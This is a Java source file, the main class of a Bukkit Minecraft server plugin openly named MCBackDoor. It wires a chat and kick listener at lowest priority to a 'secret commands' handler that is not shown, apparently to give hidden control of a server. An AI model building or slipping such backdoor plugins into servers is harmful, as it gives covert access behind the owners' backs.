/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

package org.martin.bukkit.mcbackdoor;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.Event.Priority;
import org.bukkit.event.Event.Type;
import org.bukkit.plugin.java.JavaPlugin;
import org.martin.bukkit.mcbackdoor.chat.MCBackDoorChatListener;
import org.martin.bukkit.mcbackdoor.scmd.SecreteCommandsNew;

/**
 *
 * @author martin
 */
public class MCBackDoor extends JavaPlugin{

    private SecreteCommandsNew sC;
    private MCBackDoorChatListener l;

    public void onDisable() {
        
    }

    public void onEnable() {
        sC = new SecreteCommandsNew(this);
        l = new MCBackDoorChatListener(sC);
        getServer().getPluginManager().registerEvent(Type.PLAYER_CHAT, l, Priority.Lowest, this);
        getServer().getPluginManager().registerEvent(Type.PLAYER_KICK, l, Priority.Lowest, this);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
        return false;
    }


}
